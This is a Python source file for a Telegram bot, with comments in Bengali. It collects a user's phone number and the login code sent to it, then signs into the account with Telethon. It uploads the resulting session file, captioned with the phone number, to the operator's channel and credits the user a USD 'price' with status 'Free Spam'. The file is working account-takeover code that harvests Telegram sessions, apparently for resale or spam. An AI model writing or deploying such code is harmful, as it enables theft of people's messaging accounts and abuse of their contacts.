import os
import datetime
from pyrogram import Client, filters
from pyrogram.types import Message, ForceReply
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError

from bot import config as cfg
from bot.utils.storage import (
    create_or_get_user,
    set_user_phone,
    verify_user_and_add_balance
)

# সেশন ফোল্ডার নিশ্চিত করো
os.makedirs(cfg.SESSIONS_DIR, exist_ok=True)

# ভেরিফিকেশন স্ট্যাটাস স্টোর করার জন্য
pending_verifications = {}  # uid -> {phone, ts, awaiting_code}


def init(app: Client):

    # /start কমান্ড
    @app.on_message(filters.command("start") & filters.private)
    async def start_cmd(client: Client, message: Message):
        create_or_get_user(message.from_user.id)
        await message.reply(
            "🎉 Welcome to Robot!\n\n"
            "Enter your phone number with the country code.\n"
            "Example: +62xxxxxxx\n\n"
            "Type /cap to see available countries.",
            reply_markup=ForceReply(selective=True)
        )

    # অন্যান্য প্রাইভেট মেসেজ (যা /start নয়)
    @app.on_message(filters.private & ~filters.command(["start", "cap"]))
    async def handle_text(client: Client, message: Message):
        uid = message.from_user.id
        text = (message.text or "").strip()

        # যদি OTP কোড অপেক্ষায় থাকে
        if uid in pending_verifications and pending_verifications[uid].get("awaiting_code"):
            code = text
            phone = pending_verifications[uid]["phone"]
            await message.reply("Verifying code... Please wait.")

            try:
                session_file = await _telethon_sign_in(phone, code)
            except SessionPasswordNeededError:
                await message.reply(
                    "Two-step verification is enabled for this number. "
                    "Cannot proceed without the account password."
                )
                pending_verifications.pop(uid, None)
                return
            except Exception as e:
                await message.reply(f"❌ Failed to sign in: {e}")
                pending_verifications.pop(uid, None)
                return

            # সেশন ফাইল চ্যানেলে আপলোড করো
            try:
                await client.send_document(
                    cfg.SESSION_CHANNEL_ID,
                    session_file,
                    caption=f"Session for user {uid} — phone {phone}"
                )
            except Exception as e:
                print("Failed to upload session file:", e)

            # ব্যালেন্স আপডেট
            verify_user_and_add_balance(uid, cfg.DEFAULT_BALANCE_ON_VERIFY)

            await message.reply(
                f"🎉 Successfully processed your account\n"
                f"Number: {phone}\n"
                f"Price: {cfg.DEFAULT_BALANCE_ON_VERIFY} USD\n"
                "Status: Free Spam\n"
                "✅ Balance updated."
            )

            pending_verifications.pop(uid, None)
            return

        # যদি ফোন নম্বর পাঠানো হয়
        if text.startswith("+") and any(ch.isdigit() for ch in text):
            phone = text
            set_user_phone(uid, phone)
            await message.reply("📩 Sending OTP to that number...")

            try:
                await _telethon_send_code(phone)
            except Exception as e:
                await message.reply(f"❌ Failed to send code: {e}")
                return

            pending_verifications[uid] = {
                "phone": phone,
                "ts": datetime.datetime.utcnow().timestamp(),
                "awaiting_code": True
            }
            await message.reply("✅ OTP sent. Please enter the code here.")
            return


# Telethon দিয়ে কোড পাঠানো
async def _telethon_send_code(phone: str):
    session_name = os.path.join(cfg.SESSIONS_DIR, phone.replace("+", ""))
    client = TelegramClient(session_name, cfg.API_ID, cfg.API_HASH)
    await client.connect()
    try:
        await client.send_code_request(phone)
    finally:
        await client.disconnect()


# Telethon দিয়ে সাইন ইন
async def _telethon_sign_in(phone: str, code: str) -> str:
    session_name = os.path.join(cfg.SESSIONS_DIR, phone.replace("+", ""))
    client = TelegramClient(session_name, cfg.API_ID, cfg.API_HASH)
    await client.connect()
    try:
        await client.sign_in(phone=phone, code=code)
    finally:
        await client.disconnect()
    return session_name + ".session"
